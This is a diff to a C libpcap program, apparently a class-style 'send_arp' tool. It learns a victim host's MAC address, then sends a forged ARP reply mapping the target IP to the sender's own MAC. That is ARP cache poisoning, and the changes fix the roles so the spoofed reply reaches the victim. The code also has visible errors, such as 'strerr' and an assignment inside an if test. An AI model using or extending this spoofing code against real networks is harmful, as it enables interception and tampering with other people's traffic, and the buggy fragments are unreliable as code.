@@ -69,7 +69,7 @@ int main(int argc, char *argv[]){
 		return 2;
 	}
 
-	if((pcd = pcap_open_live(dev, BUFSIZ, 1, 1000,errbuf))==NULL){
+	if((pcd = pcap_open_live(dev, BUFSIZ, 1, 50,errbuf))==NULL){
 		fprintf(strerr, "Device open failed\n");
 		return 2;
 	}
@@ -98,11 +98,9 @@ int main(int argc, char *argv[]){
 	arph.arp_pln = 0x04;
 	arph.arp_op = htons(ARPOP_REQUEST);
 	memcpy(arph.arp_sha, my_mac, ETH_ALEN);
-//	arph.arp_spa = my_ip.s_addr;
 	memcpy(arph.arp_spa, &my_ip.s_addr, 4);
-//	memcpy(arph.arp_spa, &sender_ip.sin_addr, 4);
 	memcpy(arph.arp_tha, broadcast, ETH_ALEN);
-	memcpy(arph.arp_tpa, &target_ip.sin_addr, 4);
+	memcpy(arph.arp_tpa, &sender_ip.sin_addr, 4);
  
 	memcpy(packet,ETH,sizeof(ETH));
 	memcpy(packet+14, &arph, sizeof(struct ether_arp));
@@ -115,30 +113,28 @@ int main(int argc, char *argv[]){
 	struct pcap_pkthdr *header;
 	const u_char *re_pkt_data;
 	int res=0;
-//	char target_mac[ETH_ALEN];
-	uint8_t target_mac[6];
+	uint8_t sender_mac[6];
 	while((res=pcap_next_ex(pcd, &header, &re_pkt_data))>=0){
 		if(res=0) continue;
 		struct ether_header *rethh = (struct ether_header *)re_pkt_data;
 		struct ether_arp *rarp = (struct ether_arp *)(re_pkt_data+14);
 		
 		if(rarp->arp_op == htons(ARPOP_REPLY)){
-			memmove(temp, &target_ip.sin_addr.s_addr, 4);			
+			memmove(temp, &sender_ip.sin_addr.s_addr, 4);			
 			 if (!memcmp(rarp->arp_spa,temp,4)){
 				
-				memmove(target_mac, rarp->arp_sha, 6);
+				memmove(sender_mac, rarp->arp_sha, 6);
 				break;
 			}	
 		}
 	}
-	
 	if((res==-1)||(res==-2)){
 		printf("error\n");
 		return -1;
 	}
 
 	
-	memcpy(ETH->ether_dhost,target_mac,6);
+	memcpy(ETH->ether_dhost,sender_mac,6);
 	memcpy(ETH->ether_shost,my_mac, 6);
 
 
@@ -154,14 +150,13 @@ int main(int argc, char *argv[]){
 	arph.arp_pln = 0x04;
 	arph.arp_op = htons(ARPOP_REPLY);
 	memcpy(arph.arp_sha, my_mac, 6);
-	memcpy(arph.arp_spa, &sender_ip.sin_addr, 4);
-	memcpy(arph.arp_tha, target_mac, 6);
-	memcpy(arph.arp_tpa, &target_ip.sin_addr, 4);
+	memcpy(arph.arp_spa, &target_ip.sin_addr, 4);
+	memcpy(arph.arp_tha, sender_mac, 6);
+	memcpy(arph.arp_tpa, &sender_ip.sin_addr, 4);
  
 	memcpy(packet,ETH,sizeof(ETH));
 	memcpy(packet+14, &arph, sizeof(struct ether_arp));
-
-
+	
 
 	pcap_sendpacket(pcd, packet, 42);
 
